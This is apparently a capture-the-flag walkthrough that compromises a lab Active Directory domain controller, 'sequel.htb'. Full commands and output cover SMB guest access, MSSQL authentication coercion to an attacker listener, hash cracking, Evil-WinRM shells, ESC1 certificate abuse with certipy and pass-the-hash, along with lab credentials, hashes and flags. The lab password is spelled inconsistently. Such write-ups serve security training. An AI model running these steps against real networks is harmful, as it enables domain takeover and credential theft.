
This walkthrough details the process of compromising a Windows Active Directory domain controller named `DC.sequel.htb`. The attack path involves initial reconnaissance, anonymous SMB access, MSSQL coercion to steal an NTLM hash, privilege escalation via a vulnerable certificate template, and finally, domain admin compromise

### Phase 1: Initial Reconnaissance

The first step is to discover open ports and services on the target machine.

```bash
sudo nmap -sC -sV  10.129.131.42  --open 
```

## OUTPUT
- `sudo`: Runs the command with elevated privileges, which is sometimes necessary for certain Nmap scan types.
    
- `nmap`: The network exploration tool.
    
- `-sC`: Runs default scripts. These scripts can often identify service versions and common vulnerabilities.
    
- `-sV`: Probes open ports to determine service/version information.
    
- `--open`: Shows only ports that are in an "open" state.
    
- **`10.129.131.42`**: The IP address of the target machine.

**Key Findings:**

- The target is a Windows Domain Controller (`Domain: sequel.htb`).
    
- Critical services like Kerberos (88), LDAP (389), and SMB (445) are open.
    
- The LDAP service reveals the hostname: `dc.sequel.htb`.

```output
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-05 10:02:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-11-05T10:03:25+00:00; +8h00m04s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-05T10:03:25+00:00; +8h00m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel

```

### Phase 2: Enumerating SMB and Finding Initial Foothold

The next step is to explore the SMB service, which often contains accessible shares.

**1. Add Host to Local DNS:**  
To interact with the host by its name, add it to the `/etc/hosts` file.

```bash
cat  /etc/hosts
10.129.131.42 dc.sequel.htb sequel.htb  sequel
```

**Purpose:** This confirmed the domain name and Windows version without authentication.

```bash
nxc smb 10.129.131.42 
SMB         10.129.131.42   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
```

### Phase 2: Anonymous Enumeration

**1. NetExec LDAP Anonymous Bind**
**Output:** `[-] Error... successful bind must be completed` - Anonymous binding not allowed.

```bash
nxc ldap 10.129.131.42   -u 'guest' -p ''
LDAP        10.129.131.42   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAP        10.129.131.42   389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        10.129.131.42   389    DC               [+] sequel.htb\guest: 
                                                            

```
**2. NetExec SMB Anonymous Login**
**Output:** `[+] sequel.htb\guest:` - Guest access successful but limited

```bash
nxc smb  10.129.131.42   -u 'guest' -p ''
SMB         10.129.131.42   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.131.42   445    DC               [+] sequel.htb\guest: 
                             
```

**List SMB Shares:**  
Use `smbclient` to list available shares without credentials
- `L`: Lists the available shares on the remote host.
    
**Finding:** A share named `Public` is available.

```bash
smbclient -L //10.129.131.42
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.131.42 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Access the Public Share:**  
Access the share using the `guest` account with a blank password. 
- `-U guest%`: Specifies the username (`guest`) and password (blank after the `%`).
- `-I`: Specifies the target IP address.
```bash
smbclient //10.129.131.42/Public  -U guest% -I 10.129.131.42
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1467613 blocks available
smb: \> get SQL Server Procedures.pdf  
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \SQL
smb: \> get "SQL Server Procedures.pdf"  
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (537.7 KiloBytes/sec) (average 537.7 KiloBytes/sec)
smb: \> exit


```

**Retrieve a File:**  
Inside the share, a PDF file is found and downloaded
This PDF contains credentials: `PublicUser:GuestUserCantWrite1`

![[Pasted image 20251105022559.png]]
### Phase 3: Credential Testing & Service Enumeration

**1. Test New Credentials on SMB**
**Output:** `[+] sequel.htb\PublicUser:GuestUserCanWrite1` - Domain authentication successful.

```bash
 nxc smb  10.129.131.42   -u 'PublicUser' -p 'GuestUserCanWrite1'
SMB         10.129.131.42   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.131.42   445    DC               [+] sequel.htb\PublicUser:GuestUserCanWrite1 (Guest)
                     
```

**2. Test LDAP with New Credentials**
**Output:** Successful bind but limited access.

```bash
 nxc ldap  10.129.131.42   -u 'PublicUser' -p 'GuestUserCanWrite1'
LDAP        10.129.131.42   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.131.42   636    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAPS       10.129.131.42   636    DC               [+] sequel.htb\PublicUser:GuestUserCanWrite1 
```

**3. List SMB Shares with Credentials**
**Output:** `STATUS_ACCESS_DENIED` - User lacks permissions to enumerate shares.

```bash
 nxc smb  10.129.131.42   -u 'PublicUser' -p 'GuestUserCanWrite1' --shares    
SMB         10.129.131.42   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.131.42   445    DC               [+] sequel.htb\PublicUser:GuestUserCanWrite1 (Guest)
SMB         10.129.131.42   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

**4. Test MSSQL with Domain Auth**
**Output:** `Login failed for user 'sequel\Guest'` - Domain authentication failed for MSSQL.
```bash
nxc mssql 10.129.131.42 -u 'PublicUser' -p 'GuestUserCanWrite1'
MSSQL       10.129.131.42   1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.129.131.42   1433   DC               [-] sequel.htb\PublicUser:GuestUserCanWrite1 (Login failed for user 'sequel\Guest'. Please try again with or without '--local-auth')
                          

```

**5. Test MSSQL with Local Auth**

**Success:** `[+] DC\PublicUser:GuestUserCantWrite1` - Local MSSQL access achieved!

```bash
nxc mssql 10.129.131.42 -u PublicUser -p GuestUserCantWrite1 --local-auth

```

**6. Examine SSL Certificate on LDAPS**
**Purpose:** This command:

- Connects to the LDAPS service on port 636
    
- Extracts and displays the SSL certificate information
    
- **Critical Finding:** Reveals the Certificate Authority name: `sequel-DC-CA`
    
- Shows the certificate validity period
    

This discovery of the CA name (`sequel-DC-CA`) becomes crucial later when exploiting the AD CS vulnerability, as we need to specify the exact CA name in the Certipy command.

```bash
 openssl s_client -connect 10.129.131.42:636 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates
subject=
issuer=DC=htb, DC=sequel, CN=sequel-DC-CA
notBefore=Jan 18 23:03:57 2024 GMT
notAfter=Jan  5 23:03:57 2074 GMT
```

### Phase 3: Exploiting MSSQL and Hash Theft

The discovered credentials are tested against various services. They provide access to the MSSQL service.

**1. Authenticate to MSSQL:**  
Using `netexec` (nxc) to authenticate with the found credentials. The `--local-auth` flag is crucial as it indicates a local database user, not a domain user.

```bash
nxc mssql 10.129.131.42 -u PublicUser -p GuestUserCantWrite1  --local-auth 
MSSQL       10.129.131.42   1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.129.131.42   1433   DC               [+] DC\PublicUser:GuestUserCantWrite1 
                                                
```

 **Trigger Authentication from MSSQL:** Use `netexec` to run the `mssql_coerce` module
```bash
nxc mssql 10.129.131.42 -u PublicUser -p GuestUserCantWrite1 --local-auth -M mssql_coerce -o LISTENER=10.10.16.4
```

**Coerce Authentication with Responder:**  
This technique forces the MSSQL server to authenticate to our attacker machine, allowing us to capture its NTLM hash.

- **a. Start Responder:** This tool listens for and captures authentication attempts.
```bash
sudo responder -I tun0 -wF -v  
```

```output
sql_svc::sequel:e11b74ab43903483:82E5C04F74E69B9D3F945FDAE8D3F3ED:010100000000000080ECD64C0C4EDC017CA3DAE3FF90A62C0000000002000800500058005500410001001E00570049004E002D005200450036005100390048004700320044003300360004003400570049004E002D00520045003600510039004800470032004400330036002E0050005800550041002E004C004F00430041004C000300140050005800550041002E004C004F00430041004C000500140050005800550041002E004C004F00430041004C000700080080ECD64C0C4EDC0106000400020000000800300030000000000000000000000000300000B333832C6E96D2D6E7268D29D4067FE399873832D94218CFEFF4401E34CE1A620A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000 

```

**3. Crack the Captured Hash:**  
Responder captures an NTLMv2 hash for the user `sql_svc`.

- Save the hash to a file (e.g., `hash.txt`).
    
- Use `john` with the `rockyou.txt` wordlist to crack it

```bash
 john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:01:15 DONE (2025-11-05 04:30) 0.01326g/s 141976p/s 141976c/s 141976C/s REINLY..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
- **Cracked Password:** `REGGIE1234ronnie`

### Phase 4: Gaining User Access

With valid domain credentials for `sql_svc`, we can get a shell on the target.

**1. Access via Evil-WinRM:**

```bash
evil-winrm -i 10.129.131.42  -u sql_svc  -p REGGIE1234ronnie   
```
**2. Find User Credentials:**  
While exploring, an MSSQL error log is found and downloaded.

```bash

*Evil-WinRM* PS C:\SQLServer\logs> download ERRORLOG.BAK
 
                                        
Info: Downloading C:\SQLServer\logs\ERRORLOG.BAK to ERRORLOG.BAK
                                        
Info: Download successful!


```

The log contains failed login attempts, revealing another user's credentials: `Ryan.Cooper:NuclearMosquito3`.

```bash
cat  ERRORLOG.BAK  
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.


```

**3. Switch to Ryan.Cooper:**  
Use the new credentials to get a shell as `Ryan.Cooper`.
The user flag can now be retrieved from Ryan's Desktop.
```bash

evil-winrm -i 10.129.131.42  -u Ryan.Cooper  -p NuclearMosquito3 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ..
*Evil-WinRM* PS C:\Users\Ryan.Cooper> cd Desktop
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
ed14ce3400846adaa2b52b3cb813b387
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> 
```
**Discover AD CS with NetExec**
**Purpose:** This command:

- Authenticates to SMB with Ryan.Cooper's credentials
    
- Uses the `enum_ca` module to check for Active Directory Certificate Services
    
- **Critical Finding:** Confirms AD CS is running and provides the web enrollment URL
    
- This discovery prompts the next step of using Certipy to find vulnerable certificate templates

```bash
 nxc smb 10.129.131.42 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M enum_ca
SMB         10.129.131.42   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.131.42   445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
ENUM_CA     10.129.131.42   445    DC               Active Directory Certificate Services Found.
ENUM_CA     10.129.131.42   445    DC               http://10.129.131.42/certsrv/certfnsh.asp
```

**Install Certipy**

```bash
 python3 -m venv certipy-venv
source certipy-venv/bin/activate
 pip install certipy-ad
```

### Phase 5: Privilege Escalation to Domain Admin

With a valid domain user account, we can look for privilege escalation paths. The machine is found to be running Active Directory Certificate Services (AD CS), which is vulnerable to ESC1.

**1. Discover Vulnerable Certificate Template:**  
Use `certipy` to find certificate templates that the user `Ryan.Cooper` can enroll in and that are vulnerable.

```bash
certipy find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.129.115.94 -stdout -vulnerable

```

- **Finding:** The `UserAuthentication` template is vulnerable to **ESC1**. It allows enrollees to specify their own Subject Alternative Name (SAN), enabling us to request a certificate for any user, like the domain administrator.
```output
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.


```

**2. Request a Certificate for the Administrator:**  
Exploit the ESC1 vulnerability to request a certificate for `administrator@sequel.htb`.
```bash
certipy req \
    -u 'Ryan.Cooper' -p 'NuclearMosquito3' \
    -dc-ip '10.129.115.94' -target 'dc.sequel.htb' \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'administrator@sequel.htb'
```

- This generates a file `administrator.pfx` containing the certificate and private key.
```bash
*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                       
```
**3. Authenticate with the Certificate:**  
Use the PFX file to authenticate to the domain controller and retrieve the NT hash of the administrator account.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.115.94
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```
- _Note:_ If you get a `Clock skew too great` error, synchronize your clock with the DC: `sudo ntpdate -u 10.129.115.94` and rerun the command.
```bash
sudo ntpdate -u 10.129.115.94
```

Use the PFX file to authenticate to the domain controller and retrieve the NT hash of the administrator account.
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.115.94
```

```bash
*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
                                        
```

### Phase 6: Final Compromise

Use the administrator's NT hash to gain a shell as the domain admin via Pass-The-Hash.

**1. Access as Administrator with Evil-WinRM:**
```bash
evil-winrm -i 10.129.115.94  -u administrator  -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

**2. Retrieve the Root Flag:**  
The root flag is on the Administrator's Desktop.
```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
b716bded4487dfab263aad571dfcfd7b
```